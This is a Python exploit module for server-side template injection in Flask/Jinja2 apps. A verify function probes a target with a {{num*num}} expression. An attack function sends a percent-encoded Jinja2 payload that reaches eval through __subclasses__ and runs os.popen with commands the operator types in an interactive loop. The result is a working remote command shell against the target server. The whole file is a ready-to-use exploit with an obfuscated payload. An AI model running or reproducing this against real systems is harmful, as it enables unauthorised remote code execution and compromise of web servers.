import requests
import re
import urllib
import random
from urllib import parse

def verify(url):
    relsult = {
        'name': 'Flask-ssti 代码执行漏洞',
        'vulnerable': False,
        'attack': True,
    }
    try:
        rand_num1 = random.randint(1000, 9999)
        rand_num2 = random.randint(1000, 9999)
        payload = r'/?name={{%d*%d}}' % (rand_num1, rand_num2)
        rand_product = rand_num1 * rand_num2
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        vurl = urllib.parse.urljoin(url, payload)
        req = requests.get(vurl, headers=headers, timeout=3)
        if re.search(str(rand_product), req.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = vurl
            relsult['about'] = 'https://blog.csdn.net/yukinorong/article/details/106938717'
        return relsult
    except:
        return relsult


def attack(url):
    try:
        cmd = ''
        base_payload = '?name=%7b%25%20%66%6f%72%20%63%20%69%6e%20%5b%5d%2e%5f%5f%63%6c%61%73%73%5f%5f%2e%5f%5f%62%61%73%65%5f%5f%2e%5f%5f%73%75%62%63%6c%61%73%73%65%73%5f%5f%28%29%20%25%7d%0d%0a%7b%25%20%69%66%20%63%2e%5f%5f%6e%61%6d%65%5f%5f%20%3d%3d%20%27%63%61%74%63%68%5f%77%61%72%6e%69%6e%67%73%27%20%25%7d%0d%0a%20%20%7b%25%20%66%6f%72%20%62%20%69%6e%20%63%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%76%61%6c%75%65%73%28%29%20%25%7d%0d%0a%20%20%7b%25%20%69%66%20%62%2e%5f%5f%63%6c%61%73%73%5f%5f%20%3d%3d%20%7b%7d%2e%5f%5f%63%6c%61%73%73%5f%5f%20%25%7d%0d%0a%20%20%20%20%7b%25%20%69%66%20%27%65%76%61%6c%27%20%69%6e%20%62%2e%6b%65%79%73%28%29%20%25%7d%0d%0a%20%20%20%20%20%20%7b%7b%20%62%5b%27%65%76%61%6c%27%5d%28%27%5f%5f%69%6d%70%6f%72%74%5f%5f%28%22%6f%73%22%29%2e%70%6f%70%65%6e%28%22{0}%22%29%2e%72%65%61%64%28%29%27%29%20%7d%7d%0d%0a%20%20%20%20%7b%25%20%65%6e%64%69%66%20%25%7d%0d%0a%20%20%7b%25%20%65%6e%64%69%66%20%25%7d%0d%0a%20%20%7b%25%20%65%6e%64%66%6f%72%20%25%7d%0d%0a%7b%25%20%65%6e%64%69%66%20%25%7d%0d%0a%7b%25%20%65%6e%64%66%6f%72%20%25%7d'
        print('[+] 开始执行命令,输出exit退出!')
        while cmd != 'exit':
            cmd = input('[+] 执行命令 >')
            cmd = parse.quote(cmd)
            payload = base_payload.format(cmd)
            vurl = urllib.parse.urljoin(url, payload)
            rep1 = requests.get(urllib.parse.urljoin(url, '?name='), timeout=3)
            rep2 = requests.get(vurl, timeout=3)
            re1 = re.findall('[\S]*', rep1.text)
            re2 = re.findall('[\S]*', rep2.text)
            for output in re2:
                if output != '' and output not in re1:
                    print(output)
        return True
    except:
        return False
